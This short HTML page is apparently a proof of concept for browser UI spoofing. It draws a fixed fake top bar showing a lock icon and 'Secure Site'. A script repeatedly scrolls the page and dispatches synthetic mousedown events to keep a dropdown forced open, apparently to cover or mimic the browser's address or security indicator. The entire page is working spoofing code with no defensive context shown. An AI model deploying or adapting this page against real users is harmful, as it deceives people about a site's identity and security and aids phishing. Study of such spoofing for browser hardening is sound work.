<!DOCTYPE html>
<html>
<head>
  <title></title>

  <style>
    body {
      margin: 0;
    }

    /* Fake top bar (your spoof UI) */
    #fakebar {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 50px;
      background: #202124;
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: Arial;
      font-size: 16px;
      z-index: 9999;
    }

    /* Dropdown stays visible under the bar */
    #dropdown {
      position: fixed;
      top: 55px;
      left: 50%;
      transform: translateX(-50%);
      z-index: 10000;
    }
  </style>

  <script>
    function coverBubble() { 
      setTimeout(function() {
        window.scroll(0, 120);

        var dropdown = document.getElementById('dropdown');
        var event;

        event = document.createEvent('MouseEvents');
        event.initMouseEvent('mousedown', true, true, window);

        dropdown.dispatchEvent(event);
      }, 100);
    }

    document.addEventListener("scroll", coverBubble);

    function loaded() {
      coverBubble();
    }
  </script>
</head>

<body onload="loaded()">

<!-- 🔥 Fake UI -->
<div id="fakebar">
  🔒 Secure Site — hai im jodz
</div>

<select id="dropdown" onblur="coverBubble()">
  <option value="0">first item</option>
  <option value="1">looooooooooooooooooooooooooooooooooooooooooooong item</option>
  <option value="2">item</option>
  <option value="3">item</option>
</select>
